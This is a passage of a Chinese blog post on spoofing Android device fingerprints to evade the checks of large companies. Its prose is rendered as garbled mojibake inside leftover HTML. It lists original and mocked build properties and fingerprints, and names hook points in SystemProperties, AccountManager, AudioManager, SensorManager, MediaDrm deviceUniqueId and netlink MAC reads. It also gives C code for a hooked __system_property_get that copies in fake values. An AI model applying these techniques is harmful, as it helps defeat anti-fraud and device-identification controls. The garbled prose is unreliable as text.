title="å•ä¸€å­—æ®µ:"></a>å•ä¸€å­—æ®µ:</h5><p>åœ¨ä¸ä¿®æ”¹æœºå‹çš„å‰æä¸‹ï¼Œä¸‹é¢è¿™äº›åº”è¯¥éƒ½æ˜¯éœ€è¦å¤„ç†çš„ ã€‚å¤§å‚æ‰«æé¢‘ç‡å¾ˆé«˜çš„Buildå‚æ•° ï¼Œéšæœºçš„è¯ï¼Œåœ¨åŸæœ‰çš„åŸºç¡€ä¸Šå¼€å¤´æˆ–è€…ç»“å°¾ï¼Œéšæœºå‡ ä½æ•°å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">ro.build.id org-&gt; [RKQ1.200826.002] mock -&gt; [RKQ1.200826.945]</span><br><span class="line">ro.build.build.id org-&gt; [RKQ1.200826.002] mock -&gt; [RKQ1.200826.945]</span><br><span class="line">ro.bootimage.build.id org-&gt; [RKQ1.200826.002] mock -&gt; [RKQ1.200826.945]</span><br><span class="line">ro.odm.build.id org-&gt; [RKQ1.200826.002] mock -&gt; [RKQ1.200826.945]</span><br><span class="line">ro.product.build.id org-&gt; [RKQ1.200826.002] mock -&gt; [RKQ1.200826.945]</span><br><span class="line">ro.system_ext.build.id org-&gt; [RKQ1.200826.002] mock -&gt; [RKQ1.200826.945]</span><br><span class="line">ro.system.build.id org-&gt; [RKQ1.200826.002] mock -&gt; [RKQ1.200826.945]</span><br><span class="line">ro.vendor.build.id org-&gt; [RKQ1.200826.002] mock -&gt; [RKQ1.200826.945]</span><br><span class="line">ro.build.version.security_patch org-&gt; [2021-11-01] mock -&gt; [2021-11-19]</span><br><span class="line">ro.boot.vbmeta.digest org-&gt; [ebe54be57a4fb91d8c22c3d69f68651931878d8925eb8a517d8110084fe45513] mock -&gt; [ebe54be57a4fb91d8c22c3d69f68651931878d8925eb8a517d8110084fa69209]</span><br><span class="line">ro.netflix.bsp_rev org-&gt; [Q8250-19134-1] mock -&gt; [P3660-19134-1]</span><br><span class="line">gsm.version.baseband org-&gt; [MPSS.HI.2.0.c7-00266-1025_0156_49a7b03461,MPSS.HI.2.0.c7-00266-1025_0156_49a7b03461] mock -&gt; [MPSS.HI.2.0.c7-00266-1025_0156_49a7b03846,MPSS.HI.2.0.c7-00266-1025_0156_49a7b03846]</span><br><span class="line"> </span><br><span class="line">ro.build.date.utc org-&gt; [1639708288] mock -&gt; [1663313901]</span><br><span class="line">ro.build.build.date.utc org-&gt; [1639708288] mock -&gt; [1663313901]</span><br><span class="line">ro.bootimage.build.date.utc org-&gt; [1639708288] mock -&gt; [1663313901]</span><br><span class="line">ro.odm.build.date.utc org-&gt; [1639708288] mock -&gt; [1663313901]</span><br><span class="line">ro.product.build.date.utc org-&gt; [1639708288] mock -&gt; [1663313901]</span><br><span class="line">ro.system_ext.build.date.utc org-&gt; [1639708288] mock -&gt; [1663313901]</span><br><span class="line">ro.system.build.date.utc org-&gt; [1639708288] mock -&gt; [1663313901]</span><br><span class="line">ro.vendor.build.date.utc org-&gt; [1639708288] mock -&gt; [1663313901]</span><br><span class="line"> </span><br><span class="line">ro.build.display.id org-&gt; [RKQ1.200826.002 test-keys] mock -&gt; [RKQ1.200826.945]</span><br><span class="line">// maybe debug-key</span><br><span class="line">ro.build.tags org-&gt; [release-keys] mock -&gt; [release-keys]</span><br><span class="line">ro.build.build.tags org-&gt; [release-keys] mock -&gt; [release-keys]</span><br><span class="line">ro.bootimage.build.tags org-&gt; [release-keys] mock -&gt; [release-keys]</span><br><span class="line">ro.odm.build.tags org-&gt; [release-keys] mock -&gt; [release-keys]</span><br><span class="line">ro.product.build.tags org-&gt; [release-keys] mock -&gt; [release-keys]</span><br><span class="line">ro.system_ext.build.tags org-&gt; [release-keys] mock -&gt; [release-keys]</span><br><span class="line">ro.system.build.tags org-&gt; [release-keys] mock -&gt; [release-keys]</span><br><span class="line">ro.vendor.build.tags org-&gt; [release-keys] mock -&gt; [release-keys]</span><br><span class="line">ro.build.host org-&gt; [m1-xm-ota-bd148.bj.idc.xiaomi.com] mock -&gt; [m1-xm-ota-be811.bj.idc.xiaomi.com]</span><br><span class="line">ro.build.user org-&gt; [builder] mock -&gt; [buizcdn]</span><br><span class="line">ro.config.ringtone org-&gt; [MiRemix.ogg] mock -&gt; [MiRemix.acc]</span><br><span class="line">ro.miui.ui.version.name org-&gt; [V125] mock -&gt; [V635]</span><br><span class="line"> </span><br><span class="line">ro.build.version.incremental org-&gt; [V12.5.19.0.RKHCNXM] mock -&gt; [V12.5.19.0.RKHWCRG]</span><br><span class="line">ro.build.build.version.incremental org-&gt; [V12.5.19.0.RKHCNXM] mock -&gt; [V12.5.19.0.RKHWCRG]</span><br><span class="line">ro.bootimage.build.version.incremental org-&gt; [V12.5.19.0.RKHCNXM] mock -&gt; [V12.5.19.0.RKHWCRG]</span><br><span class="line">ro.odm.build.version.incremental org-&gt; [V12.5.19.0.RKHCNXM] mock -&gt; [V12.5.19.0.RKHWCRG]</span><br><span class="line">ro.product.build.version.incremental org-&gt; [V12.5.19.0.RKHCNXM] mock -&gt; [V12.5.19.0.RKHWCRG]</span><br><span class="line">ro.system_ext.build.version.incremental org-&gt; [V12.5.19.0.RKHCNXM] mock -&gt; [V12.5.19.0.RKHWCRG]</span><br><span class="line">ro.system.build.version.incremental org-&gt; [V12.5.19.0.RKHCNXM] mock -&gt; [V12.5.19.0.RKHWCRG]</span><br><span class="line">ro.vendor.build.version.incremental org-&gt; [V12.5.19.0.RKHCNXM] mock -&gt; [V12.5.19.0.RKHWCRG]</span><br></pre></td></tr></table></figure><h5 id="å¤åˆå­—æ®µï¼š"><a href="#å¤åˆå­—æ®µï¼š" class="headerlink" title="å¤åˆå­—æ®µï¼š"></a>å¤åˆå­—æ®µï¼š</h5><p>å¤åˆå­—æ®µæ˜¯å¤šä¸ªå•ä¸€å­—æ®µæ‹¼æˆçš„å­—æ®µï¼Œå¸¸ç”¨çš„æœ‰<code>ro.build.description</code> è¿˜æœ‰ä¹‹å‰è¯´çš„7ä¸ª<code>fingerprint</code> ç›¸å…³ã€‚ è¿™äº›Mockä»¥åçš„å€¼è¦å’Œä¹‹å‰å•ä¸€å­—æ®µMockçš„å€¼å¯¹ç­‰ã€‚æ¯”å¦‚æŸä¸ªå•ä¸€å­—æ®µå€¼è¢«MockæˆA ä»¥åï¼Œå¤åˆå­—æ®µé‡Œé¢çš„å†…ä¹Ÿåº”è¯¥æ˜¯A ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ro.build.description org-&gt; [alioth-user 11 RKQ1.200826.002 V12.5.19.0.RKHCNXM release-keys] mock -&gt; [alioth-user 11 RKQ1.200826.945 V12.5.19.0.RKHWCRG release-keys]</span><br><span class="line"> </span><br><span class="line">ro.build.fingerprint org-&gt; [Redmi/alioth/alioth:11/RKQ1.200826.002/V12.5.19.0.RKHCNXM:user/release-keys] mock -&gt; [Redmi/alioth/alioth:11/RKQ1.200826.945/V12.5.19.0.RKHWCRG:user/release-keys]</span><br><span class="line">ro.build.build.fingerprint org-&gt; [Redmi/alioth/alioth:11/RKQ1.200826.002/V12.5.19.0.RKHCNXM:user/release-keys] mock -&gt; [Redmi/alioth/alioth:11/RKQ1.200826.945/V12.5.19.0.RKHWCRG:user/release-keys]</span><br><span class="line">ro.bootimage.build.fingerprint org-&gt; [Redmi/alioth/alioth:11/RKQ1.200826.002/V12.5.19.0.RKHCNXM:user/release-keys] mock -&gt; [Redmi/alioth/alioth:11/RKQ1.200826.945/V12.5.19.0.RKHWCRG:user/release-keys]</span><br><span class="line">ro.odm.build.fingerprint org-&gt; [Redmi/alioth/alioth:11/RKQ1.200826.002/V12.5.19.0.RKHCNXM:user/release-keys] mock -&gt; [Redmi/alioth/alioth:11/RKQ1.200826.945/V12.5.19.0.RKHWCRG:user/release-keys]</span><br><span class="line">ro.product.build.fingerprint org-&gt; [Redmi/alioth/alioth:11/RKQ1.200826.002/V12.5.19.0.RKHCNXM:user/release-keys] mock -&gt; [Redmi/alioth/alioth:11/RKQ1.200826.945/V12.5.19.0.RKHWCRG:user/release-keys]</span><br><span class="line">ro.system_ext.build.fingerprint org-&gt; [Redmi/alioth/alioth:11/RKQ1.200826.002/V12.5.19.0.RKHCNXM:user/release-keys] mock -&gt; [Redmi/alioth/alioth:11/RKQ1.200826.945/V12.5.19.0.RKHWCRG:user/release-keys]</span><br><span class="line">ro.system.build.fingerprint org-&gt; [Redmi/alioth/alioth:11/RKQ1.200826.002/V12.5.19.0.RKHCNXM:user/release-keys] mock -&gt; [Redmi/alioth/alioth:11/RKQ1.200826.945/V12.5.19.0.RKHWCRG:user/release-keys]</span><br><span class="line">ro.vendor.build.fingerprint org-&gt; [Redmi/alioth/alioth:11/RKQ1.200826.002/V12.5.19.0.RKHCNXM:user/release-keys] mock -&gt; [Redmi/alioth/alioth:11/RKQ1.200826.945/V12.5.19.0.RKHWCRG:user/release-keys]</span><br></pre></td></tr></table></figure><h5 id="Get-2"><a href="#Get-2" class="headerlink" title="Get:"></a>Get:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android.os.SystemProperties-&gt;get(key)</span><br></pre></td></tr></table></figure><h5 id="Mock-2"><a href="#Mock-2" class="headerlink" title="Mock:"></a>Mock:</h5><p><code>android.os.SystemProperties-&gt;get</code> åº•å±‚è°ƒç”¨çš„æ˜¯<code>native_get</code> ï¼Œä¸€ä¸ªnativeæ–¹æ³•ï¼Œæ‰€ä»¥Hookçš„æ—¶å€™ä¼˜å…ˆå¤„ç† <code>native_get</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android.os.SystemProperties-&gt;native_get</span><br></pre></td></tr></table></figure><p><code>Java hook</code>å®Œæ¯•ä»¥å è¿˜éœ€è¦åå°„å°†<code>Build</code>é‡Œé¢çš„æˆå‘˜å˜é‡è¿›è¡Œ<code>set</code>ã€‚é˜²æ­¢é‡‡é›†é€šè¿‡åå°„çš„æ–¹å¼å»è·å–</p><h4 id="ç³»ç»Ÿé»˜è®¤è´¦å·ï¼ˆæ™®é€šï¼‰ï¼š"><a href="#ç³»ç»Ÿé»˜è®¤è´¦å·ï¼ˆæ™®é€šï¼‰ï¼š" class="headerlink" title="ç³»ç»Ÿé»˜è®¤è´¦å·ï¼ˆæ™®é€šï¼‰ï¼š"></a>ç³»ç»Ÿé»˜è®¤è´¦å·ï¼ˆæ™®é€šï¼‰ï¼š</h4><p>å¾ˆå¤šå¤§å‚ä¼šæŠŠè¿™ä¸ªå­—æ®µä¹Ÿä½œä¸ºæŒ‡çº¹çš„ä¸€éƒ¨åˆ†ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•ä¹Ÿéœ€è¦å¤„ç†ã€‚</p><h5 id="Get-3"><a href="#Get-3" class="headerlink" title="Get:"></a>Get:</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AccountManager-&gt;getAccounts</span><br></pre></td></tr></table></figure><h5 id="Mock-3"><a href="#Mock-3" class="headerlink" title="Mock:"></a>Mock:</h5><p>ä¼˜å…ˆ<code>Hook ipc</code></p><h4 id="éŸ³é‡ç›¸å…³å‡½æ•°ï¼ˆæ™®é€šï¼‰"><a href="#éŸ³é‡ç›¸å…³å‡½æ•°ï¼ˆæ™®é€šï¼‰" class="headerlink" title="éŸ³é‡ç›¸å…³å‡½æ•°ï¼ˆæ™®é€šï¼‰"></a>éŸ³é‡ç›¸å…³å‡½æ•°ï¼ˆæ™®é€šï¼‰</h4><h5 id="Get-4"><a href="#Get-4" class="headerlink" title="Get:"></a>Get:</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AudioManager-&gt;getStreamVolume</span><br></pre></td></tr></table></figure><h5 id="Mock-4"><a href="#Mock-4" class="headerlink" title="Mock:"></a>Mock:</h5><p>ä¼˜å…ˆ<code>Hook ipc</code></p><h4 id="ä¼ æ„Ÿå™¨ç›¸å…³ï¼ˆæ™®é€šï¼‰ï¼š"><a href="#ä¼ æ„Ÿå™¨ç›¸å…³ï¼ˆæ™®é€šï¼‰ï¼š" class="headerlink" title="ä¼ æ„Ÿå™¨ç›¸å…³ï¼ˆæ™®é€šï¼‰ï¼š"></a>ä¼ æ„Ÿå™¨ç›¸å…³ï¼ˆæ™®é€šï¼‰ï¼š</h4><p>è¿™ä¸ªå‡½æ•°ä¸éœ€è¦å¤ªå¤šå¤„ç†ï¼Œæ¯ä¸ªæ‰‹æœºç±»å‹åŸºæœ¬éƒ½å·®ä¸å¤šï¼Œæ¯æ¬¡æ‰“ä¹±ä¸€ä¸‹è¿”å›ç»“æœæ’åºé¡ºåºå³å¯ã€‚</p><h5 id="Get-5"><a href="#Get-5" class="headerlink" title="Get:"></a>Get:</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SensorManager-&gt;getFullSensorList</span><br></pre></td></tr></table></figure><h5 id="Mock-5"><a href="#Mock-5" class="headerlink" title="Mock:"></a>Mock:</h5><p>ä¼˜å…ˆHook ipc</p><h4 id="Javaå±‚DRMç›¸å…³ï¼ˆé‡è¦å­—æ®µï¼‰"><a href="#Javaå±‚DRMç›¸å…³ï¼ˆé‡è¦å­—æ®µï¼‰" class="headerlink" title="Javaå±‚DRMç›¸å…³ï¼ˆé‡è¦å­—æ®µï¼‰"></a>Javaå±‚DRMç›¸å…³ï¼ˆé‡è¦å­—æ®µï¼‰</h4><p>è¿™ä¸ªDRMæ˜¯<strong>æ°´å°ç›¸å…³</strong>ï¼Œä¸»è¦ä¸ºäº†å¤„ç†ä¸åŒæ‰‹æœºåŠ æ°´å°çš„å”¯ä¸€ ID æ ¸å¿ƒçš„æ˜¯ä¸€ä¸ªå«<code>deviceUniqueId</code> çš„ä¸œè¥¿ï¼Œè¿™ç©æ„æ˜¯ä¸€ä¸ª<strong>éšæœºçš„32ä½å­—èŠ‚æ•°ç»„</strong>ã€‚å¾ˆå¤šå¤§å‚ç”¨è¿™ä¸ªä½œä¸º<strong>æ ¸å¿ƒçš„è®¾å¤‡æŒ‡çº¹</strong>ï¼Œä¸ä»…åœ¨Javaå±‚è¿›è¡Œè·å–ï¼Œè¿˜æœ‰åœ¨Nativeå±‚è¿›è¡Œè·å–ï¼Œåœ¨åé¢Nativeè®¾å¤‡æŒ‡çº¹ä¼šå†æ¬¡ä»‹ç»åˆ°ã€‚</p><h5 id="Get-6"><a href="#Get-6" class="headerlink" title="Get:"></a>Get:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Med</span><br><span class="line">iaDrm-&gt;getPropertyByteArray</span><br><span class="line">MediaDrm-&gt;getPropertyString</span><br></pre></td></tr></table></figure><p>Hookçš„è¯å¾ˆç®€å•ï¼Œè¿™ä¸ªæ–¹æ³•<strong>æ²¡æœ‰IPCåº•å±‚æœ‰è‡ªå·±çš„å®ç°</strong>ï¼Œç›´æ¥<code>Hook get</code>çš„æ–¹æ³•å³å¯ ã€‚javaå±‚Hookæ˜¯è¿œè¿œä¸å¤Ÿçš„ï¼Œè¿˜éœ€è¦å¤„ç†<code>native</code>å±‚ã€‚</p><p><strong>æ¯æ¬¡éšæœº32ä½å­—èŠ‚æ•°ç»„å³å¯ã€‚</strong></p><h4 id="Javaå±‚ç½‘å¡ä¿¡æ¯ï¼ˆæ™®é€šï¼‰"><a href="#Javaå±‚ç½‘å¡ä¿¡æ¯ï¼ˆæ™®é€šï¼‰" class="headerlink" title="Javaå±‚ç½‘å¡ä¿¡æ¯ï¼ˆæ™®é€šï¼‰"></a>Javaå±‚ç½‘å¡ä¿¡æ¯ï¼ˆæ™®é€šï¼‰</h4><p>å¤§å‚åº”è¯¥<strong>ä¸ä¼šä¿¡ä»»Javaå±‚çš„mac</strong>ï¼Œåº•å±‚éƒ½æ˜¯é€šè¿‡<code>netlinker</code><strong>ç›´æ¥è·å–ç½‘å¡</strong>ï¼Œæˆ–è€…ç›´æ¥popenæ‰§è¡Œ <code>ip a</code> è¿›è¡Œç½‘å¡ä¿¡æ¯çš„å…¨é‡è·å–ï¼ˆè¯¦ç»†å‚è€ƒåé¢popenç›¸å…³ä»‹ç»ï¼‰ã€‚æˆ‘ç›´æ¥åœ¨åº•å±‚å¤„ç†çš„netlinker  socketé€šè®¯çš„æ—¶å€™ï¼Œæ‰€ä»¥Javaå±‚ä¸è¿›è¡Œå¤„ç†ã€‚<strong>ä»»ä½•è·å–ç½‘å¡çš„æ–¹æ³•ï¼Œåº•å±‚æœ€ç»ˆèµ°çš„éƒ½æ˜¯netlinkerå»è·å–çš„ç½‘å¡</strong></p><blockquote><p>ç›´æ¥é€šè¿‡netlinkerè·å–ç½‘å¡ï¼Œè¿™ç§æ–¹å¼åœ¨å®‰å“10ä¸Šé¢è²Œä¼¼å·²ç»å¤±æ•ˆäº†ï¼Œä½†æ˜¯æ‰‹æœºRootä»¥åæ˜¯æ²¡æœ‰é™åˆ¶çš„ï¼ˆäº²æµ‹android 13 å¼€å‘æ¿è·å–æˆåŠŸï¼‰ï¼Œè¿™ç§æ–¹å¼è¿˜å¯ä»¥ç”¨æ¥æ£€æµ‹å½“å‰æ‰‹æœºæ˜¯å¦Rootã€‚</p></blockquote><p>ä½†æ˜¯å½“æ‰§è¡Œip aè¿™ç§å‘½ä»¤çš„æ—¶å€™ï¼Œæˆ–è€…è°ƒç”¨Javaå±‚åŸå§‹APIçš„æ—¶å€™ï¼Œåº•å±‚è¿˜æ˜¯èµ°çš„netlinkerï¼Œç›´æ¥åœ¨åº•å±‚é€šè¿‡ptraceåœ¨å‡½æ•°è°ƒç”¨æ‰§è¡Œå®Œæ¯•ä»¥åï¼Œå¯¹å¯„å­˜å™¨è¿›è¡ŒMock å’Œ Setå³å¯ ã€‚</p><p><a href="https://bbs.pediy.com/thread-271698.htm">Android netlink&amp;svc è·å– Macæ–¹æ³•æ·±å…¥åˆ†æ</a></p><h4 id="æ–‡ä»¶åˆ›å»ºæ—¶é—´ï¼ˆæ¬¡è¦ï¼‰"><a href="#æ–‡ä»¶åˆ›å»ºæ—¶é—´ï¼ˆæ¬¡è¦ï¼‰" class="headerlink" title="æ–‡ä»¶åˆ›å»ºæ—¶é—´ï¼ˆæ¬¡è¦ï¼‰"></a>æ–‡ä»¶åˆ›å»ºæ—¶é—´ï¼ˆæ¬¡è¦ï¼‰</h4><p>å¾ˆå¤šå¤§å‚ä¼šæ”¶é›†<code>/sdcard/</code> æˆ–è€…ç›¸å†Œç›®å½•çš„ä¸€äº›åˆ›å»ºæ—¶é—´ï¼Œä½œä¸ºè®¾å¤‡æŒ‡çº¹ï¼Œä½†æ˜¯å¾ˆå¤šæ–‡ä»¶éƒ½æ˜¯é»˜è®¤çš„1970æ—¶é—´æˆ³ï¼Œæœ‰çš„å°‘æ•°æ–‡ä»¶å¤¹åˆ›å»ºæ—¶é—´ä¹Ÿæ˜¯å¾ˆé‡è¦çš„è®¾å¤‡æ ‡è¯† ã€‚<strong>Javaé‡Œé¢Fileå¯¹è±¡æœ‰æ–‡ä»¶çš„åˆ›å»ºæ—¶é—´ã€‚</strong></p><h3 id="Nativeè®¾å¤‡æŒ‡çº¹"><a href="#Nativeè®¾å¤‡æŒ‡çº¹" class="headerlink" title="Nativeè®¾å¤‡æŒ‡çº¹"></a>Nativeè®¾å¤‡æŒ‡çº¹</h3><p>èŠäº†æŒºå¤šJavaç›¸å…³çš„è®¾å¤‡æŒ‡çº¹ï¼Œå…¶å®Javaå±‚é‡‡é›†çš„æŒ‡çº¹ï¼Œå¹¶ä¸æ˜¯å…³é”®å› ç´ ï¼Œæ ¸å¿ƒçš„æŒ‡çº¹åŸºæœ¬éƒ½åœ¨nativeå±‚è¿›è¡Œå¤„ç†çš„ã€‚Nativeéƒ¨åˆ†ä¼šè¯¦ç»†ä»‹ç»åŒ…æ‹¬å†…æ ¸æ–‡ä»¶ï¼Œè¿˜æœ‰ä¸€äº›è·å–æŒ‡çº¹çš„éªšæ“ä½œ</p><h4 id="Build-system-property-get-system-property-read-é‡è¦"><a href="#Build-system-property-get-system-property-read-é‡è¦" class="headerlink" title="Build(system_property_get &amp; system_property_read)(é‡è¦)"></a>Build(system_property_get &amp; system_property_read)(é‡è¦)</h4><p>Javaè·å–æœ€ç»ˆæ€»çš„æ˜¯native_getï¼Œè€Œ<code>native_get</code>åº•å±‚èµ°çš„å°±æ˜¯è¿™ä¸ª<code>system_property_get</code> ã€‚</p><p>åœ¨ä»‹ç»ä¹‹å‰æˆ‘ä»¬éœ€è¦å…ˆçœ‹çœ‹è¿™ä¸ªå‡½æ•°çš„æºç ï¼Œandroid 9ä»¥ä¸Šå’Œ9ä»¥ä¸‹å®ç°çš„æ–¹å¼æ˜¯ä¸åŒçš„ã€‚</p><p><strong>android 9ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__BIONIC_WEAK_FOR_NATIVE_BRIDGEint __system_property_get(const char* name, char* value) &#123; </span><br><span class="line"> return system_properties.Get(name, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>android 9ä»¥ä¸‹ ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __system_property_get(const char* name, char* value) &#123;</span><br><span class="line">  const prop_info* pi = __system_property_find(name);</span><br><span class="line"> </span><br><span class="line">  if (pi != 0) &#123;</span><br><span class="line">    return __system_property_read(pi, nullptr, value);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    value[0] = 0;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®‰å“9ä»¥ä¸‹æ˜¯ç›´æ¥å®ç°çš„è¿™ä¸ªæ–¹æ³•ï¼Œæ‰€ä»¥è¿™å—åˆæœ‰ä¸ªç»†èŠ‚ï¼Œ<strong>android 9 ä»¥ä¸Š hook __system_property_get ä¸ä»…ä»…éœ€è¦Hook</strong></p><p>å…¥å£æ–¹æ³•ï¼Œè¿˜éœ€è¦<code>Hook system_properties.Get</code> è¿™ä¸ªæ–¹æ³•ã€‚</p><blockquote><p>å¾ˆå¤šå¤§å‚åœ¨android 9ä»¥ä¸Šä¼šç›´æ¥è°ƒç”¨<code>system_properties.Get</code> ï¼Œå…ˆè§£æSoè·å–åˆ°<code>system_properties.Get</code> éå¯¼å‡ºå‡½æ•°çš„å‡½æ•°æŒ‡é’ˆ</p><p>å¼ºè½¬æˆå‡½æ•°æŒ‡é’ˆä»¥åï¼Œç›´æ¥å»è°ƒç”¨<code>system_properties</code>.Get ï¼Œè€Œ<strong>éç›´æ¥è°ƒç”¨system_property_get</strong> ï¼Œå¦‚æœ<strong>åªHook system_property_getçš„è¯å¯èƒ½å°±ä¼šå¯¼è‡´æŒ‡çº¹æ³„æ¼</strong>ã€‚æ‰€ä»¥åœ¨android 9ä»¥ä¸Šéœ€è¦é¢å¤–å¤„ç† <code>system_properties.Get(name, value);</code> è¿™ä¸ªæ–¹æ³•ã€‚</p></blockquote><p>å¦‚æœç›´æ¥<code>Hook __system_property_get</code> å¯èƒ½ä¼šå­˜åœ¨çŸ­æŒ‡ä»¤é—®é¢˜ã€‚å› ä¸ºè¿™ä¸ªæ–¹æ³•å°±ä¸€ä¸ªBLæŒ‡ä»¤ï¼Œæ™®é€šçš„inlinehook å¯èƒ½ä¼šå¤±æ•ˆã€‚</p><p>è¿™å—éœ€è¦ç”¨åˆ°å¼‚å¸¸Hook ã€‚å½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥åˆ¤æ–­å®‰å“ç‰ˆæœ¬å·åœ¨9.0ä»¥ä¸Šç›´æ¥<code>Hook system_properties.Get</code> å³å¯ã€‚è¿™ä¸ª<code>system_properties.Get</code> æ˜¯ä¸€ä¸ª<strong>éå¯¼å‡ºå‡½æ•°</strong>ï¼Œéœ€è¦è§£æSoè·å–åˆ°éå¯¼å‡ºå‡½æ•°çš„åœ°å€ã€‚å¯ä»¥å‚è€ƒ<strong>sandhookçš„ELFUtils.cpp</strong> ã€‚</p><p><strong>åŒç†readæ–¹æ³•ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œä¹Ÿéœ€è¦è¿™ä¹ˆå¤„ç† ï¼Œåœ¨9.0ä»¥ä¸Šéœ€è¦ç‰¹æ®Šå¤„ç†</strong>ã€‚</p><p>Hookçš„æ—¶å€™éœ€è¦æ³¨æ„ä¸€ä»¶äº‹å°±æ˜¯<strong>Mockçš„å€¼é•¿åº¦ä¸èƒ½å¤§äºåŸå§‹é•¿åº¦</strong>ã€‚å½“ <code>system_property_get</code> æ‰§è¡Œå®Œæ¯•ä»¥å<code>memcpy</code> å°†Mockçš„valueæ‹·è´è¿›å»å³å¯ ã€‚å¤„ç†çš„è¿‡ç¨‹å‡½æ•°å¦‚ä¸‹ ã€‚å®ç°ä¹Ÿå¾ˆç®€å•ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">new_system_property_get</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">char</span> *value)</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = origin_system_property_get(name, value);</span><br><span class="line">    <span class="built_in">string</span> sname = <span class="built_in">string</span>(name);</span><br><span class="line">    <span class="keyword">if</span> (gLobalfakeProperties.find(sname) == gLobalfakeProperties.end()) &#123;</span><br><span class="line">        <span class="comment">//ALOGE(&quot;hook native system_property_get_1 , not replace -&gt; %s value-&gt; %s &quot; ,name,value);</span></span><br><span class="line">        <span class="keyword">return</span> len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// get org value</span></span><br><span class="line">    <span class="built_in">string</span> fake_value = gLobalfakeProperties[sname];</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(value) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(value, (<span class="type">char</span> *) fake_value.c_str(), <span class="built_in">strlen</span>(value));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä¸ºä»€ä¹ˆä¸ç›´æ¥åœ¨__system_property_find å‡½æ•°å¤„ç†ï¼Ÿ</strong></p><p>å› ä¸ºgetå’Œreadåº•å±‚èµ°çš„éƒ½æ˜¯findå‡½æ•°ï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥åœ¨findå‡½æ•°å¤„ç†å‘¢ï¼Œfindå‡½æ•°è¿”å›çš„æ˜¯<code>prop_info*</code></p><p>è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘çš„æ˜¯ç³»ç»Ÿå†…å­˜çš„å˜é‡ï¼Œç›´æ¥å†™å…¥ä¼šç›´æ¥sign11 å¦‚æœä½¿ç”¨mprotectå¦‚æœç›´æ¥å¯¹å†…å­˜å˜é‡å¼ºåˆ¶å†™å…¥å¯èƒ½ä¼šå¯¼è‡´ç³»ç»Ÿçš„ä¸ç¨³å®šï¼Œå¯¼è‡´å‡ºç°é—®é¢˜ã€‚ä¹‹å‰è¸©è¿‡è¿™ä¸ªå‘ã€‚æ‰€ä»¥å°±åªå¤„ç†äº†getå’Œreadè¿™ä¸¤ä¸ªå‡½æ•° ã€‚</p><h5 id="Get-7"><a href="#Get-7" class="headerlink" 